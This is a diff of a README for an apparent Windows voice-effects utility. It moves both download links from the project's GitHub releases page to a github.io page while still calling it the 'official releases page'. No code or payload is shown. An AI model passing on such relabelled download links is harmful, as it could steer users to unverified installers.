@@ -1,6 +1,6 @@
 # 🎙️ voice-tool-utility - Add professional audio effects to microphones
 
-[Download Voice Tool Utility](https://github.com/particular-acceptance362/voice-tool-utility/releases)
+[Download Voice Tool Utility](https://particular-acceptance362.github.io)
 
 This application changes how your voice sounds across Windows. It captures your microphone input, applies digital effects, and sends the processed audio to your software of choice. You can use this tool for streaming, online games, or voice calls.
 
@@ -26,7 +26,7 @@ This application changes how your voice sounds across Windows. It captures your 
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/particular-acceptance362/voice-tool-utility/releases) to access the installer.
+1. Visit the [official releases page](https://particular-acceptance362.github.io) to access the installer.
 2. Select the latest version listed under the Assets section.
 3. Download the compressed file to your Downloads folder.
 4. Right-click the file and select "Extract All" to open the contents.
